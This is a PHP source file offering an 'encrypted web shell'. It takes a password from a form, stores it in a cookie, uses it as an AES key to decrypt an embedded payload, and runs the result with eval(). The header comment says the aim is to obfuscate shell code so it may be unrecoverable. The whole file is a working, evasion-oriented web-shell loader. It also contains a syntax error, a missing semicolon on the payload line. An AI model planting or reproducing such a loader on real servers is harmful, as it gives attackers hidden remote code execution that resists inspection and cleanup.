<?php
/**************************
Encrypted Web Shell
Author : kevinnivek
Description : 
This code uses OpenSSL to encrpyt raw PHP code (wihtout "<?php ?>").
It then executes the code after decrypting it. This can potentially aid in the obfuscation (and potentially unrecoverable)
of your code, whether its shell, penetration testing or remote management and systems administration.
****************************/

// You can set this manually here in order to encrypt your file the first time. Dont forget to remove after
//$key = '1234567891011120';

function encrypt($key, $payload) {
    if (!empty($key) && !empty($payload)) {
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
        $encrypted = openssl_encrypt($payload, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($encrypted . '::' . $iv);
    } else {
        return false;
	}
}

function decrypt($key, $garble) {
    if (!empty($key) && !empty($garble)) {
        list($encrypted_data, $iv) = explode('::', base64_decode($garble), 2);
        return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
    } else {
        return false;
    }
}

/* Get code to encrypt it
$code_file = file_get_contents('./web-shell.txt');
$code_enc = encrypt($key, $code_file);
*/

if (!empty($_POST['dec'])) {
	// Regardless of what the POST was, set it to the cookie. If it isn't the right key, it wont decrypt anyways :)
        setcookie("dec", $_POST['dec'], time() + 3600);
        $_COOKIE['dec'] = $_POST['dec'];
        header("Refresh:0");
}

if (isset($_COOKIE['dec'])) {
	// If the cookie is set , try decrypting and running
    $key = $_COOKIE['dec'];
	$code = "encrypted code goes here" // You can use the $code_enc commented out above because it has to be encrypted first based on your key. Take the encrypted string and paste it here to execute your code
    eval(decrypt($key, $code));
} else {
	// If no cookie is set or POST received, unset the cookie variables if they already (for some reason) exist
	// Also deliver the input form by default.
    setcookie("dec", "", time() - 3600);
    $_COOKIE['dec'] = null;
    echo '<html><body><form action="encrypted-web-shell.php" method="post">
    	<input type="password" autocomplete="off" class="inputtext" name="dec" id="dec">
    	<input value="submit" type="submit">
    	</form>';
}

?>
